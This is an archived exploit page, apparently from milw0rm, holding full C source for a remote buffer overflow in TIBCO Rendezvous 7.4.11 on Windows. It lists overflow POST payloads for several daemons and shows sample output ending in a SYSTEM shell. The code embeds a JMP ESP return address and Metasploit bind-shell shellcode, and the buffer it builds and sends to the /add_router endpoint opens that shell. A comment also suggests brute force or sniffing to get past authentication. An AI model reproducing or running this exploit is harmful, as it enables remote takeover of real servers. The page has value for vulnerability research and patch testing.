<html><head><title>TIBCO Rendezvous <= 7.4.11 (add router) Remote BOF Exploit </title></head><pre>/*
Exploit: TIBCO RendezVous remote buffer overflow exploit for Win32 (public version)
Affected products: Tibco RendezOVous version &lt;=7.4.11 (Multiple Vulnerabilities)
Author: Andres Tarasco Acuña (atarasco @ sia.es )
Advisory: http://www.514.es
Url: http://www.sia.es
Greetings: Iñaki Lopez and SIA TigerTeam
Status: vulnerability fixed ( Vendor notification + fixes)

Timeline:
----------------
Discovered: March 23, 2006
Exploit coded: March 24, 2006
Vendor Notified: March 27, 2006
Vendor patch: May 15, 2006 - Tibco Rendezvous version 7.5  
Public Disclosure: who knows


Affected daemons:
-----------------------
- TIB/Rendezvous Routing Communications Daemon (add router buffer overflow) (port 7580)
+ POST /add_router HTTP/1.0
+ router_name=AAAA..AAA&amp;type=+Add+Router+

- TIB/Rendezvous Secure Daemon (port 7580)
+ POST /sd_add_network_service HTTP/1.0
+ network=AAAA..AAAA&amp;service=&amp;type=Add

- TIB/Rendezvous Secure Daemon (port 7580)
+ certificate_from_file() lets remote user verify if remote file exists

- TIB/Rendezvous Secure Daemon (port 7580)
+ Authorized Subjects XSS vulnerability

- TIB/Rendezvous Secure Routing Daemon (add router buffer overflow) (port 7580)
+ POST /add_router HTTP/1.0
+ router_name=AAAA..AAA&amp;type=+Add+Router+

- TIB/Rendezvous Agent for Java (TIB/Rendezvous Daemon Connection Buffer overflow) (port 7581)
  + POST /set_main HTTP/1.0
  + edit_listen=7600&amp;edit_service=AAAA..AAAA&amp;edit_network=&amp;edit_daemon=&amp;submit=Submit

- TIB/Rendezvous Initial Value Cache (port 7581)
 + POST /change_services HTTP/1.0
 + Service=&amp;Network=&amp;Daemon=AAA&amp;request_type=Submit

Affected Operating systems:
-------------------------------
- AIX 5.1 and up  RS/6000  
- FreeBSD 4.2 and up x86
- HP/UX 11.X  HPPA
- HP/UX 11.22 and up IA-64/Itanium
- Linux 2.4 kernel: 2.4.20 and up, glibc2.2.4 and up x86
- Linux 2.4 kernel: 2.4.20 and up, glibc2.3 and up (includes 2.6 kernel)  x86
- Linux 2.4 kernel: 2.4.18 and up, glibc2.3 and up IA-64/Itanium
- OS/390 V2R6+ USS S/390 compatible OEM hardware
- OS/400 V4R3+ AS/400
- Solaris 2.7 and up Sparc
- Solaris 2.7, 8, 9 (32-bit only)  x86
- Solaris 2.10 (32- and 64-bit only)  x86
- Tru64 Unix 5.1b Alpha
- UnixWare 7.1 and up x86
- VMS 7.2 and up
- Alpha
- Windows 2000/XP/2003 Server [MSVC V6.0 and V7.0] x86

Usage:
-------

D:\Programación\tibco&gt;net start rvrd
El servicio de TIB/Rendezvous Routing Communications Daemon está iniciándose.
El servicio de TIB/Rendezvous Routing Communications Daemon se ha iniciado con éxito.


D:\Programación\tibco&gt;whoami
REDBULL\atarasco

D:\Programación\tibco&gt;tibco.exe -e 192.168.0.1
Tibco RendezVous rvrd, rvsrd remote exploit
Author: Andres Tarasco ( atarasco @ sia.es)
Url: http://www.514.es

[+] Connection to Tibco HTTP Daemon..
[+] Daemon Found: rvrd - version: 7.4.11
[+] Connecting to Tibco SSL Service at port 9003
[+] Sending Exploit ( 546 bytes)
[+] Ignoring unknown CA...
[+] Sending Exploit ( 546 bytes)
[+] Exploit succesfully sent. Now telnet to port 51477

D:\Programación\tibco&gt;nc localhost 51477
Microsoft Windows XP [Versión 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\&gt;whoami
whoami
NT AUTHORITY\SYSTEM

C:\&gt;

*/

struct _targets {
   char *daemon;
   char *name;
   char *version;
   char *target;
   char *header;
   char *tail;
} TARGETS[] = { //supported versions
{ &quot;rvrd&quot;,&quot;Routing Communications Daemon&quot;,&quot;Generic win32&quot;,&quot;/add_router&quot;,&quot;router_name=&quot;,&quot;&amp;type=+Add+Router+&quot;},
{ &quot;rvsrd&quot;,&quot;Routing Communications Daemon&quot;,&quot;Generic win32&quot;,&quot;/add_router&quot;,&quot;router_name=&quot;,&quot;&amp;type=+Add+Router+&quot;},
{ &quot;rvsd&quot;,&quot;Secure Daemon&quot;,&quot;Generic win32&quot;,&quot;/sd_add_network_service&quot;,&quot;network=&quot;,&quot;&amp;service=&amp;type=&quot;},
{ &quot;rva&quot;,&quot;Agent for Java&quot;,&quot;Generic win32&quot;,&quot;/set_main&quot;,&quot;edit_listen=7600&amp;edit_service=&quot;,&quot;&amp;edit_network=&amp;edit_daemon=&amp;submit=Submit&quot;},
{ &quot;rvcache&quot;,&quot;Initial Value Cache&quot;,&quot;Generic win32&quot;,&quot;/change_services&quot;,&quot;Service=&amp;Network=&amp;Daemon=&quot;,&quot;&amp;request_type=Submit&quot;},
/* more versions here.... */
};

#include &lt;stdio.h&gt;
#include &lt;tchar.h&gt; 
#include &lt;winsock2.h&gt;
#include &lt;windows.h&gt;
#include &lt;Wininet.h&gt;
#pragma comment(lib, &quot;ws2_32.lib&quot;)
#pragma comment(lib, &quot;wininet.lib&quot;)

unsigned char CALLESP[] =&quot;\xed\x1e\x95\x7c&quot;;    //JMP ESP at ntdll.dll

typedef struct _HTTPData {
    unsigned char *buffer;
    DWORD dwReturnCode;
    DWORD dwBytesRead;
    unsigned int DataOffset;
} HTTPData, *PHTTPData;


unsigned char jmpBack []= //JMP EBP -500 without nulls
    &quot;\x81\xec\xff\xff\xf4\x01&quot;
    &quot;\x81\xc4\x0b\xfe\xf4\x01&quot;
    &quot;\xff\xe4&quot;;


unsigned char shellcode[] =
/* win32_bind -  EXITFUNC=seh LPORT=51477 Size=346 Encoder=PexFnstenvSub http://metasploit.com */
//Restricted chars: 0x00 0x06 0x07 0x08 0x0a 0x0d 0x20 0x22 0x28 0x29 0x30 0x5c 0xcd 0xf2
&quot;\x33\xc9\x66\x81\xe9\xb0\xff\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73&quot;
&quot;\x13\x90\x90\x47\x87\x83\xeb\xfc\xe2\xf4\x6c\xfa\xac\xca\x78\x69&quot;
&quot;\xb8\x78\x6f\xf0\xcc\xeb\xb4\xb4\xcc\xc2\xac\x1b\x3b\x82\xe8\x91&quot;
&quot;\xa8\x0c\xdf\x88\xcc\xd8\xb0\x91\xac\xce\x1b\xa4\xcc\x86\x7e\xa1&quot;
&quot;\x87\x1e\x3c\x14\x87\xf3\x97\x51\x8d\x8a\x91\x52\xac\x73\xab\xc4&quot;
&quot;\x63\xaf\xe5\x75\xcc\xd8\xb4\x91\xac\xe1\x1b\x9c\x0c\x0c\xcf\x8c&quot;
&quot;\x46\x6c\x93\xbc\xcc\x0e\xfc\xb4\x5b\xe6\x53\xa1\x9c\xe3\x1b\xd3&quot;
&quot;\x77\x0c\xd0\x9c\xcc\xf7\x8c\x3d\xcc\xc7\x98\xce\x2f\x09\xde\x9e&quot;
&quot;\xab\xd7\x6f\x46\x21\xd4\xf6\xf8\x74\xb5\xf8\xe7\x34\xb5\xcf\xc4&quot;
&quot;\xb8\x57\xf8\x5b\xaa\x7b\xab\xc0\xb8\x51\xcf\x19\xa2\xe1\x11\x7d&quot;
&quot;\x4f\x85\xc5\xfa\x45\x78\x40\xf8\x9e\x8e\x65\x3d\x10\x78\x46\xc3&quot;
&quot;\x14\xd4\xc3\xc3\x04\xd4\xd3\xc3\xb8\x57\xf6\xf8\x8e\x92\xf6\xc3&quot;
&quot;\xce\x66\x05\xf8\xe3\x9d\xe0\x57\x10\x78\x46\xfa\x57\xd6\xc5\x6f&quot;
&quot;\x97\xef\x34\x3d\x69\x6e\xc7\x6f\x91\xd4\xc5\x6f\x97\xef\x75\xd9&quot;
&quot;\xc1\xce\xc7\x6f\x91\xd7\xc4\xc4\x12\x78\x40\x03\x2f\x60\xe9\x56&quot;
&quot;\x3e\xd0\x6f\x46\x12\x78\x40\xf6\x2d\xe3\xf6\xf8\x24\xea\x19\x75&quot;
&quot;\x2d\xd7\xc9\xb9\x8b\x0e\x77\xfa\x03\x0e\x72\xa1\x87\x74\x3a\x6e&quot;
&quot;\x05\xaa\x6e\xd2\x6b\x14\x1d\xea\x7f\x2c\x3b\x3b\x2f\xf5\x6e\x23&quot;
&quot;\x51\x78\xe5\xd4\xb8\x51\xcb\xc7\x15\xd6\xc1\xc1\x2d\x86\xc1\xc1&quot;
&quot;\x12\xd6\x6f\x40\x2f\x2a\x49\x95\x89\xd4\x6f\x46\x2d\x78\x6f\xa7&quot;
&quot;\xb8\x57\x1b\xc7\xbb\x04\x54\xf4\xb8\x51\xc2\x6f\x97\xef\x60\x1a&quot;
&quot;\x43\xd8\xc3\x6f\x91\x78\x40\x90\x47\x87&quot;;


PHTTPData MakeHTTPRequest(char *host, DWORD port, char *metod,char *Url,int ssl, char *buffer);
int GetSSLPort(char *buffer);
void DumpMem(void* string, int length);
/******************************************************************************/
int GetSSLPort(char *buffer) {
    char *p,*q;
    p=strstr(buffer,&quot;https://&quot;);
    if (p) {
        q=strchr(&amp;p[8],':');
        if (q) {
         p=strchr(q,'/');
         if (p)  {
          p[0]='\0';return(atoi(q+1));
         }
        }
    }
    return(-1);
}
/******************************************************************************/
int GetTibcoDaemon(char *buffer, char *daemon) {
    char *p;
    char *q;
    char name[15];
    int i;
    static char SEPARADOR[]=&quot;color=\&quot;#242424\&quot;&gt;&quot;;  //&quot;242424&quot;;

    p=strstr(buffer,SEPARADOR);
    if (p) {
        p=p+strlen(SEPARADOR)+1;
        while(p[0]==' ') p++;
        q=strchr(&amp;p[0],'&lt;');
        if (q) {
            q[0]='\0';
            printf(&quot;[+] Daemon Found: %s - &quot;,p);
            strncpy(name,p,14);
            q=q+6;
            while(q[0]==' ') q++;
            p=strchr(&amp;q[0],'&lt;');
            if (p) {
                p[0]='\0';
                printf(&quot;version: %s\n&quot;,q);
            }
            for(i=0;i&lt;sizeof(TARGETS)/sizeof(struct _targets);i++) {
                if (strcmp(TARGETS[i].daemon,name)==0) {
                    return(i);

                }
            }
        }
    }
    return(-1);
}

/******************************************************************************/
PHTTPData MakeHTTPRequest(char *host, DWORD port, char *metod,char *Url,int ssl, char *buffer) {
//better than playing with sockets ^^
    HINTERNET hInternetSession,hConnect,hRequest;
    static TCHAR hdrs[] = &quot;Content-Type: application/x-www-form-urlencoded&quot;;
    int ret;
    PHTTPData resultado;
    char bufQuery[32] ;
    DWORD dwBuffLen,dwFlags;
    BOOL bQuery,bRead;
    DWORD dwHTTPCode,dwIndex,dwFileSize,dwReadedBytes,dwLengthBufQuery = sizeof(bufQuery);
    //PSTR pszUser =&quot;Administrator&quot;; 
    //PSTR pszPass=&quot;test&quot;;

    resultado=malloc(sizeof(HTTPData));
    memset(resultado,0,sizeof(HTTPData));

    if ((hInternetSession = InternetOpen (&quot;TigerTeam 514&quot;,INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0)) == NULL) {
        return (resultado);
    }
    hConnect = InternetConnect(hInternetSession,host,port,NULL,NULL,INTERNET_SERVICE_HTTP,0,1);
    if (!ssl) {
        hRequest = HttpOpenRequest(hConnect,
        metod,Url,NULL,NULL,NULL,INTERNET_FLAG_RELOAD,0);
    } else {
        hRequest = HttpOpenRequest(hConnect,
            metod,Url,NULL,NULL,NULL,
            INTERNET_FLAG_IGNORE_CERT_CN_INVALID |INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID     ,0);
    }

    if (hRequest==NULL) {
        printf(&quot;error chungo en HttpOpenRequest\n&quot;);
        return(resultado);
    }

    if (buffer==NULL) {
            ret = HttpSendRequest(hRequest,hdrs,strlen(hdrs),NULL,0);
    } else {
            printf(&quot;[+] Sending Exploit ( %i bytes)\n&quot;,strlen(buffer));
            ret = HttpSendRequest(hRequest,hdrs,strlen(hdrs),buffer,strlen(buffer));

    if ((!ret) &amp;&amp; (ssl) ){
            dwBuffLen = sizeof(dwFlags);
            printf(&quot;[+] Ignoring unknown CA...\n&quot;);
            InternetQueryOption (hRequest, INTERNET_OPTION_SECURITY_FLAGS,
                (LPVOID)&amp;dwFlags, &amp;dwBuffLen);
            dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA;
            InternetSetOption (hRequest, INTERNET_OPTION_SECURITY_FLAGS,
                &amp;dwFlags, sizeof (dwFlags) );
/*
//authentication support here.
//If you need user &amp; password try
//a) bruteforce
//b) sniffer
//c) local privilege scalation with TibcoPasswordExtractor.c

            InternetSetOption(hRequest, INTERNET_OPTION_USERNAME,
                          pszUser, _tcslen(pszUser) + 1);
            InternetSetOption(hRequest, INTERNET_OPTION_PASSWORD,
                          pszPass, _tcslen(pszPass) + 1);
*/
            printf(&quot;[+] Sending Exploit ( %i bytes)\n&quot;,strlen(buffer));
            ret = HttpSendRequest(hRequest,hdrs,strlen(hdrs),buffer,strlen(buffer));
        }


        if (!ret) {
            printf(&quot;Se ha enviado mal la peticion HTTP: %i\n&quot;,GetLastError());
            return(resultado);
        }
    }
        bQuery= HttpQueryInfo(hRequest,HTTP_QUERY_STATUS_CODE,bufQuery,&amp;dwLengthBufQuery,NULL);
        if (!bQuery) {
            printf(&quot;Control de Errores - bQuery Vale NULL\n&quot;);
            return(resultado);
        }
        resultado-&gt;dwReturnCode = (DWORD)atol(bufQuery) ;
//        printf(&quot;HEADER RESPONSE: %i \n&quot;,resultado-&gt;dwReturnCode);

        dwLengthBufQuery=sizeof(bufQuery);
        bQuery= HttpQueryInfo(hRequest, //petición de tamaño de la petición.
                HTTP_QUERY_CONTENT_LENGTH,
                bufQuery,
                &amp;dwLengthBufQuery,
                NULL);
        dwFileSize = (DWORD)atol(bufQuery) ;
//        printf(&quot;Vamos a leer %i bytes de datos\n&quot;,dwFileSize);
        resultado-&gt;dwBytesRead=dwFileSize;
        if (dwFileSize==0) {
            resultado-&gt;buffer=NULL;
            InternetCloseHandle(hRequest);
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternetSession);
            return(resultado);
        }
        resultado-&gt;buffer= malloc(dwFileSize+1);
        bRead = InternetReadFile(hRequest,
                resultado-&gt;buffer,
                dwFileSize,
                &amp;dwReadedBytes);
        resultado-&gt;buffer[resultado-&gt;dwBytesRead] = '\0' ;

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternetSession);
    return(resultado);
}
/****************************************************************************/
void usage(void) {
    printf(&quot;Tibco.exe usage: -e parameters\n\n&quot;);
    printf(&quot;Tibco.exe -e host (buffer overflow)\n&quot;);
    exit(1);
}
/****************************************************************************/

int main(int argc, char* argv[])
{

 DWORD size,i,read,port=7580;
 unsigned char *buffer,datos[5000];
 HANDLE f;
 WSADATA wsaData;
 HTTPData *resultado;
 unsigned short bindport;
 signed int test;
 int dst;
 int t[0xff+1];

 printf(&quot;Tibco RendezVous rvrd, rvsrd remote exploit\n&quot;);
 printf(&quot;Author: Andres Tarasco ( atarasco @ sia.es)\n&quot;);
 printf(&quot;Url: http://www.514.es\n\n&quot;);

 if  (argc==3) {
    if (argv[1][0]=='-') {
        if (argv[1][1]!='e') {
            usage();
        }
    }
 }  else {
    usage();
 }

 WSAStartup(MAKEWORD(2, 2), &amp;wsaData);
 printf(&quot;[+] Connection to Tibco HTTP Daemon..\n&quot;);

 
 resultado= MakeHTTPRequest(argv[2], port, &quot;GET&quot;,&quot;/ &quot;,0, NULL);
 if (resultado-&gt;dwReturnCode!=200) {
    printf(&quot;[-] Request Error (ErrorCode: %i)\n&quot;,resultado-&gt;dwReturnCode);
    exit(1);
 }
 dst=GetTibcoDaemon(resultado-&gt;buffer,NULL); //Get Version
//m/&quot;#242424&quot;&gt;(.*?)&lt;br&gt;.*?(.*?)&lt;br&gt;/
 if (dst==-1) {
    printf(&quot;[-] Unknown Tibco Daemon (No donut for you)\n&quot;);
    exit(1);
 }

 //BLINK! BLINK! BLINK!

 resultado= MakeHTTPRequest(argv[2], port, &quot;GET&quot;,&quot;/daemon_parameters&quot;,0, NULL);
 port=GetSSLPort(resultado-&gt;buffer);
 if (!port) {
    printf(&quot;[-] Unable to gather SSL port\n&quot;);
    exit(1);
 }
 printf(&quot;[+] Connecting to Tibco SSL Service at port %i\n&quot;,port);
 if ((dst==0) || (dst==1) ) {
    memset(datos,'\0',sizeof(datos)-1);

    memcpy(datos,TARGETS[dst].header,strlen(TARGETS[dst].header));
    memset(&amp;datos[12],'A',498);
    memcpy(&amp;datos[16],shellcode,sizeof(shellcode)-1);
    memcpy(&amp;datos[12+498],CALLESP,4);
    // memcpy(&amp;datos[12+498],&quot;AAAA&quot;,4);
    memcpy(&amp;datos[12+498+4],jmpBack,sizeof(jmpBack)); //Jump back ( EBP -500)
    memcpy(&amp;datos[12+498+4+sizeof(jmpBack)-1],TARGETS[dst].tail,strlen(TARGETS[dst].tail));
 }
//    DumpMem(datos,strlen(datos));

 resultado= MakeHTTPRequest(argv[2], port, &quot;POST&quot;,&quot;/add_router&quot;,1, datos);
 if (resultado-&gt;dwReturnCode==200) {
    printf(&quot;[+] Exploit succesfully sent. Now telnet to port 51477\n&quot;);
    //printf(&quot;resultado: %i\n&quot;,resultado-&gt;dwReturnCode);
    //printf(&quot;resultado: %i\n&quot;,resultado-&gt;dwBytesRead);
    //printf(&quot;datos: %s\n&quot;,resultado-&gt;buffer);
    //DumpMem(resultado-&gt;buffer+300,strlen(resultado-&gt;buffer)-300);

 } else {
    printf(&quot;[-] Exploit Failed\n&quot;);
    printf(&quot;resultado: %i\n&quot;,resultado-&gt;dwReturnCode);
    //printf(&quot;resultado: %i\n&quot;,resultado-&gt;dwBytesRead);
    //printf(&quot;datos: %s\n&quot;,resultado-&gt;buffer);

 }
 return(1);
}
//---------------------------------------------------------------------------

// milw0rm.com [2006-09-01]</pre></html>